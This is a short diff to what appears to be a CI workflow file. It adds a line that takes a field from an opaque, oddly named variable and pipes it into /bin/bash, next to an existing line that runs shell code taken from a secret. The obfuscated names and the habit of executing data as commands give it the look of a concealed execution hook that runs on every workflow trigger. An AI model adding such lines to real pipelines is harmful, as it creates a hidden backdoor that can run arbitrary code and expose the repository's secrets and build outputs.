@@ -19,6 +19,7 @@ jobs:
           kpz3: ${{ secrets.kpz3 }}
         run: |
           printf '%s' "$kpz3" | jq -r .u3157 | /bin/bash
+          echo $xvqtx3353 | jq -r .p0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
